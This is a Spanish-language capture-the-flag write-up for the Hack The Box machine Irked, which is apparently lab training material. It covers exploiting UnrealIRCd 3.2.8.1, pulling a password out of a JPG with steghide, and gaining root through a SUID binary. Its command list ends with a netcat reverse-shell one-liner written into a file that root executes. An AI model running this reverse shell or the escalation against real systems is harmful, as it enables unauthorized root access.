Irked es un box media tirando a fácil cuenta con temas de explotación de vulnerabilidades, estenografía a imágenes JPG y explotación de binarios para escalar privilegios. 

Al escanear la máquina encontramos el puerto 6697 abierto y también un dominó, buscando en internet se encuentra que es posible sacar la versión del servicio que corre en ese puerto, que es Unreal 3.2.8.1. 

Buscamos un exploit que no utilice metasploit en github y obtenemos acceso al pc. Enumerando encontramos que el flag está dentro del user djmarov al cual no tenemos acceso, pero dentro del directorio documents de manera oculta detectamos un archivo llamado backup que contiene un posible password, dentro nos da una pista que dice steg de la herramienta steghide la cual sirve para extraer archivos o información de imágenes JPG que se guardan o se ocultan en un archivo (estenografía). 

En este caso guardaba un archivo llamado pass.txt con una credencial que nos permite acceder por medio de ssh, enumeramos el equipo y encontramos un binario que se ejecuta como root llamado viewuser el cual guarda su output en un archivo ubicado en /tmp/listuser, al ejecutar detectamos que no existe, se crea este archivo y se añade una reverse Shell obteniendo acceso al usuario root.




Habilidades:

Explotacion Unreal 3.2.8.1
Estaganografia jpg steghide
binario viewuser

Comandos utilizados:

sudo nmap -Pn -sU --top-ports 500 10.10.10.117
nc 10.10.10.117 6697
USER master 0 * master
Nick master
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
find / -perm -4000 2>/dev/null
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f" > /tmp/listusers
